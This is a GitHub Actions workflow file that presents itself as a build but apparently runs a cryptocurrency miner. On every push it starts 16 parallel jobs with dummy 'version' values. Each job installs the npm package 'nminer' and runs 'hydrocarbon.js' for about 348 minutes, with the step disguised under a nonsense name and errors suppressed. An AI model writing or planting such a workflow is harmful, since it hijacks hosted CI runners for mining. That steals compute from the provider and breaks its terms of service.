name: hydrocarbon
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4694 }
          - { version: 2506 }
          - { version: 2494 }
          - { version: 1696 }
          - { version: 2380 }
          - { version: 863 }
          - { version: 7812 }
          - { version: 238 }
          - { version: 7800 }
          - { version: 2584 }
          - { version: 6140 }
          - { version: 2422 }
          - { version: 5098 }
          - { version: 4637 }
          - { version: 6610 }
          - { version: 2408 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: guacamole eek jut ew
        run: |
          npm install nminer@latest
          timeout 348m node hydrocarbon.js || echo "hydrocarbon executed"